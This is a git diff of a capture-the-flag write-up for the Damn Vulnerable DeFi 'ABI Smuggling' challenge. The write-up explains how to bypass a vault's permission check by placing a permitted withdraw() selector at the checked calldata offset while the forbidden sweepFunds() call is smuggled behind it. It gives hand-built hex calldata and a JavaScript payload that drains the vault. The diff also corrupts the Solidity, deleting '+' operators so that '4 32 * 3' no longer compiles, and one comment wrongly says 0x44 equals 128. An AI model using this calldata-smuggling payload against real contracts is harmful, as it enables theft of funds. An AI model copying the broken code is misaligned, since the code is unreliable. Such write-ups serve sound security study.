@@ -58,7 +58,7 @@ abstract contract AuthorizedExecutor is ReentrancyGuard {
     function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
         // Read the 4-bytes selector at the beginning of `actionData`
         bytes4 selector;
-        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
+        uint256 calldataOffset = 4 32 * 3; // calldata position where `actionData` begins
         assembly {
             selector := calldataload(calldataOffset)
         }
@@ -131,7 +131,7 @@ contract SelfAuthorizedVault is AuthorizedExecutor {
             revert InvalidWithdrawalAmount();
         }
 
-        if (block.timestamp <= _lastWithdrawalTimestamp + WAITING_PERIOD) {
+        if (block.timestamp <= _lastWithdrawalTimestamp WAITING_PERIOD) {
             revert WithdrawalWaitingPeriodNotEnded();
         }
 
@@ -232,11 +232,9 @@ If `data1` is "Hello" and `data2` is "World," calling encode("Hello", "World") a
 
 # Subverting
 
-Checking a static position in clearly manipulable calldata can serve as an effective way to bypass permissions, granting us the ability to execute our desired actions. In this specific scenario, this is where `sweepFunds()` comes into play.
+When we look at the abi-smuggling.challenge.js file, we have permission to access the function selectors `0x85fb709d` and `0xd9caed12` which are `sweepFunds()` and `withdraw()` functions in the `SelfAuthorizedVault` contract. Also this functions are selected `onlyThis` modifier. Which means, only the `SelfAuthorizedVault` contract can call these functions.
 
-
-
-To take funds, we need to pass the auth part.
+To bypass this problem we can call `execute()` function to trigger `functionCall()` method. However, we need to pass the authentication mechanism.
 
 ```solidity
 if (!permissions[getActionId(selector, msg.sender, target)]) {
@@ -244,13 +242,83 @@ if (!permissions[getActionId(selector, msg.sender, target)]) {
 }
 ```
 
+Thankfully, the `getActionId()` function encode the values with `encodePacked()` method. As we previously mentioned [from here](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/tree/main/Challenges/ABI%20Smuggling#abi-encoding-of-dynamic-types), this method causes a craft collision when used with dynamic types.
+
+Also, we are authorized only `withdraw()`, but we want to call `sweepFunds()` function.
+
+> Checking a static position in clearly manipulable calldata can serve as an effective way to bypass permissions, granting us the ability to execute our desired actions. In this specific scenario, this is where `sweepFunds()` comes into play.
+
+When we look at how authorization of `execute()` works, the `selector` is 4 bytes at the offset 100 in calldata.
+
+```solidity
+function execute(address target, bytes calldata actionData) external nonReentrant returns (bytes memory) {
+  // Read the 4-bytes selector at the beginning of `actionData`
+  bytes4 selector;
+  uint256 calldataOffset = 4 32 * 3; // calldata position where `actionData` begins
+  assembly {
+    selector := calldataload(calldataOffset)
+  }
+```
+
+If we call execute function in this way, transaction will reverted with `NotAllowed()` error and the data's value looks like this:
+
+```js
+const calldata = vault.interface.encodeFunctionData('sweepFunds', [recovery.address, token.address])
+const data = vault.interface.encodeFunctionData('execute', [vault.address, calldata])
+console.log(data)
+await player.sendTransaction({
+            to: vault.address,
+            data: data
+        })
+```
+```
+// Data
+0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f05120000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
+```
+
+Let's explain it shortly.
+
+```
+// 4 byte selector for 'execute'
+0x1cff79cd
+// vault.address (1. param of execute)
+000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+// 32 byte calldata offset (2. param of execute)
+0000000000000000000000000000000000000000000000000000000000000040
+// 32 byte calldata length
+0000000000000000000000000000000000000000000000000000000000000044
+// Actual calldata, selector is starting at offset 100 from the start of the calldata
+85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
+```
+
+Then, we will change the value into this:
+
+```
+// execute selector
+0x1cff79cd
+// vault.address
+000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512
+// offset -> start of the calldata (128 bytes in decimal - 4 x 32 bytes)
+0000000000000000000000000000000000000000000000000000000000000080
+// empty data (third 32 bytes)
+0000000000000000000000000000000000000000000000000000000000000000
+// insert the withdraw selector at offset 100 from the start of entire calldata
+d9caed1200000000000000000000000000000000000000000000000000000000
+// start of the calldata (calldata length) (0x44 = 128 in decimal) 4x32 bytes = 0x80 = 128 offset
+0000000000000000000000000000000000000000000000000000000000000044
+// sweepFunds calldata
+85fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000
+```
+
+Thus, `sweepFunds()` getting smuggled behind withdraw's function signature to trigger a bypass. So that the contract authorizes us by manipulating calldata.
 
 Here are the attacker commands:
 
 ```js
+const payload = "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000"
 await player.sendTransaction({
             to: vault.address,
-            data: "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000"
+            data: payload
         })
 ```
 
@@ -259,7 +327,7 @@ Solve the challenge.
 ```powershell
 
   [Challenge] ABI smuggling
-    ✔ Execution (184ms)
+    ✔ Execution (176ms)
 
 
   1 passing (2s)
